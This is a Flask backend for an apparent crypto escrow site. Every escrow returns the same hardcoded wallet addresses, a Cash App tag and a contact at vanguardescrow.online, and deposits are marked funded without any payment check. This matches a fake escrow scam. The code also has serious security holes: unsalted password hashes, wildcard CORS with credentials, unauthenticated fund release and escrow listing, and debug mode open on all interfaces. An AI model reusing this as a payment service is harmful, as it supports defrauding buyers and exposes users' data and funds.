from flask import Flask, request, jsonify
from flask_cors import CORS
import hashlib
import uuid
import sys
import io

# Force UTF-8 output for Windows console
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

app = Flask(__name__)

# Explicit CORS config
CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True,
     allow_headers=["Content-Type", "Authorization"],
     methods=["GET", "POST", "OPTIONS"])

users = {}
escrows = {}  # store all escrows here

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def generate_user_id():
    return str(uuid.uuid4())

def generate_escrow_id():
    return str(uuid.uuid4())[:8]  # short ID

# ---------- AUTH ----------
@app.route("/signup", methods=["POST"])
def signup():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "Invalid or missing JSON body"}), 400

    email = data.get("email")
    password = data.get("password")

    if not email or not password:
        return jsonify({"error": "Email and password are required"}), 400

    if email in users:
        return jsonify({"error": "User already exists"}), 409

    users[email] = {
        "user_id": generate_user_id(),
        "password_hash": hash_password(password)
    }

    return jsonify({"status": "success", "user_id": users[email]["user_id"]})


@app.route("/login", methods=["POST"])
def login():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "Invalid or missing JSON body"}), 400

    email = data.get("email")
    password = data.get("password")

    if not email or not password:
        return jsonify({"error": "Email and password are required"}), 400

    user = users.get(email)
    if not user or user["password_hash"] != hash_password(password):
        return jsonify({"error": "Invalid credentials"}), 401

    return jsonify({"status": "success", "user_id": user["user_id"]})

# ---------- ESCROW ----------
@app.route("/createEscrow", methods=["POST"])
def create_escrow():
    data = request.get_json(silent=True)
    terms = data.get("terms")
    if not terms:
        return jsonify({"error": "Terms are required"}), 400

    escrow_id = generate_escrow_id()
    wallet = """USDT TRC20 Wallet: TKTVFbMAyEh6p9kydRNfavxy6hEvyfsTBR
USDT ERC20 Wallet: 0x2bc86574cd42770bdb208f37b7d1d94e5f6d4f02
BTC (BEP20) Wallet: 0x2bc86574cd42770bdb208f37b7d1d94e5f6d4f02
Cash App Tag (USA only): $VanguardAdams
Bank Transfer (Revolut Instant): Contact support@vanguardescrow.online
NB: Bank transfers not supported above $5000"""

    amount = "100 USDT"  # demo amount

    escrows[escrow_id] = {
        "terms": terms,
        "wallet": wallet,
        "amount": amount,
        "status": "Pending"
    }

    return jsonify({
        "escrowId": escrow_id,
        "wallet": wallet,
        "amount": amount
    })


@app.route("/confirmDeposit", methods=["POST"])
def confirm_deposit():
    data = request.get_json(silent=True)
    escrow_id = data.get("escrowId")
    if escrow_id not in escrows:
        return jsonify({"error": "Escrow not found"}), 404

    escrows[escrow_id]["status"] = "Funded"
    return jsonify({"escrowId": escrow_id, "status": "Funded"})


@app.route("/releaseFunds", methods=["POST"])
def release_funds():
    data = request.get_json(silent=True)
    escrow_id = data.get("escrowId")
    if escrow_id not in escrows:
        return jsonify({"error": "Escrow not found"}), 404

    escrows[escrow_id]["status"] = "Released"
    return jsonify({"escrowId": escrow_id, "status": "Released"})


@app.route("/myEscrows", methods=["GET"])
def my_escrows():
    return jsonify(escrows)


# ---------- RUN ----------
if __name__ == "__main__":
    print("Flask backend running at http://127.0.0.1:5000")
    app.run(host="0.0.0.0", port=5000, debug=True)
